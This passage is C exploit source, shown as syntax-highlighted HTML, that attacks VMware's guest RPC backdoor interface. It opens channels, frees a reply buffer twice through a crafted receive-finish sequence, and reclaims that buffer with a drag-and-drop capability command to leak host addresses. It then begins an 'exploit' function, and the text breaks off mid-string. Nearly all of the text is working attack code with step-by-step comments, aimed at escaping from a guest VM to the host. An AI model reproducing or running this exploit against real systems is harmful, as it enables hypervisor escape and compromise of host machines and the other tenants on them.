%%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffer....,bp:0x5555556DD3EF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b 